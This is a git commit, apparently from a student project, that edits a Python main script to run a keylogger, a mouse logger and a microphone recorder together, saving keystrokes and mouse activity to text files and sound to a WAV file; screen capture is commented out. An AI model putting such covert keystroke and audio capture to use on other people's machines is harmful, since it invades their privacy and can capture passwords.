f98ecc4dc76c7e48fc01f95abcaeb0a279afed75
GuerroisTheo <theo.guerrois@edu.esiee.fr>
2020-06-05 11:11:16 +0200

    Mise a jour pour le recorde son
    Juste get image à décommenter

--- main.py
+++ main.py
@@ -1,8 +1,8 @@
 import keylog
 import time
-import getImage
-import getSound
+#import getImage
 import Mouselogger
+from Recorder_Son import Recorder
 
 def main():
 
@@ -10,27 +10,37 @@ def main():
     # test_mouselog(5)
     # test_getImage()
     # test_getSound(2)
-    #test_threading()
-    pass
+    test_threading()
+    #pass
 
 
 def test_threading():
     klog = keylog.KeyLogger() 
     mlog = Mouselogger.Mouselog()
-    getIm = getImage.GetImage()
+    #getIm = getImage.GetImage()
+    
+    GetS = Recorder()
+    S = GetS.open('Sortie_GetS.wav')
+    S.start_recording()
+    print("Lancement du son")
+
+
     print("objets intanciés")
     klog.start()
     print("keylog lancé")
     mlog.start()
     print("mouselog lancé")
-    getIm.start()
+    
+    #getIm.start()
     print("Capture Image lancée")
-    time.sleep(600)
+    time.sleep(10)
+    print("hop hop on stop le record")
+    S.stop_recording()
     klog.stop()
     print("keylog arrêté")
     mlog.stop()
     print("mouselog arrêté")
-    getIm.join()
+    #getIm.join()
     print("Capture image arrêtée")
     klog.write_on_file("keyboard.txt")
     mlog.write_on_file("mouse.txt")
